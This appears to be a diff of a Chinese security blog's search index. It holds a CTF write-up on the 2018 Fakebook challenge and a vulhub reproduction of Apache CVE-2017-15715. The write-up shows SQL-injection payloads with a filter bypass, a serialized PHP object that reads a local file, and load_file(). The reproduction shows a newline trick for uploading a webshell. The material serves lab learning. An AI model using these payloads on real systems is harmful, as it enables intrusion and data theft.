+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
+<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
+<ul>
+<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
+</ul>
+<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
+<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网鼎杯 2018 Fakebook</title>
-    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
-<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
-<h1 id="第一次sql注入">第一次sql注入</h1>
-<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
-<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
-<h2 id="获取字段数">获取字段数</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
-<h2 id="测试显示位">测试显示位</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
-<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
-<p>上面的信息很丰富：</p>
-<ul>
-<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
-<li>显示位为 2</li>
-<li>地址为：<strong>/var/www/html/view.php</strong></li>
-</ul>
-<h2 id="常规注入">常规注入</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
-<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
-<h1 id="信息收集">信息收集</h1>
-<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
-<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>（这里也说明，blog是有特殊的格式要求的。）</p>
-<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
-<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
-<h1 id="第二次sql注入">第二次sql注入</h1>
-<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
-<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
-<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
-<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
-<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
-<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
-<h1 id="其他注入方法">其他注入方法</h1>
-<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
-<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -422,12 +494,46 @@
 <p>经过这十道题，发现sql注入不仅仅是常规类型的考察，还有不同语句，如：update，insert into等。有时候还要猜测后台语句的写法，或者像 Level-6一样，注入语句中返回的结果作为输入二次查询，还得明白常见的后台判断。总之，收获良多，是很好的题目。</p>
 ]]></content>
       <categories>
-        <category>SQL注入</category>
+        <category>CTF</category>
         <category>Web安全</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
         <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
+<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
+<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
+<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
+<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
+<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
+<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
+<p>成功获得 webshell。</p>
+<h1 id="总结">总结</h1>
+<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
+<h1 id="资源">资源</h1>
+<ol type="1">
+<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -753,6 +859,64 @@
       </categories>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2018 Fakebook</title>
+    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
+<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
+<h1 id="第一次sql注入">第一次sql注入</h1>
+<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
+<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
+<h2 id="获取字段数">获取字段数</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
+<h2 id="测试显示位">测试显示位</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
+<p>上面的信息很丰富：</p>
+<ul>
+<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
+<li>显示位为 2</li>
+<li>地址为：<strong>/var/www/html/view.php</strong></li>
+</ul>
+<h2 id="常规注入">常规注入</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
+<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
+<h1 id="信息收集">信息收集</h1>
+<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
+<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>（这里也说明，blog是有特殊的格式要求的。）</p>
+<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
+<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
+<h1 id="第二次sql注入">第二次sql注入</h1>
+<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
+<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
+<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
+<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
+<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
+<h1 id="其他注入方法">其他注入方法</h1>
+<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
+<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
